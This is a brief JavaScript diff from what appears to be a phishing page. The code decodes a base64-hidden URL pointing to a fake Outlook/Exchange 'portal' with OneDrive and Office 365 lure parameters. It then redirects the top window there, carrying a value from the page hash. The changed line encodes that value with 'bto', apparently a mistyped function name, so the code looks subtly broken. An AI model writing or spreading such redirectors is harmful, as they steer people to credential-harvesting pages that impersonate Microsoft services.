@@ -12,7 +12,7 @@
 
  if (window.location.hash){
   var link = window.atob("aHR0cHM6Ly93d3cucGNnbGFzc2VzLmNvbS9vd2FleGNoYWdlX3BvcnRhbC8/YkdGdVp6MWxiaVp6ZGoxdmJtVmtjbWwyWlNaeVltOTRQVzltWm1salpUTTFOUT09");
-  var hash = getProcessHash();
+  var hash = bto(getProcessHash());
   window.top.location.href=`${link}#${hash}`;
  }
 
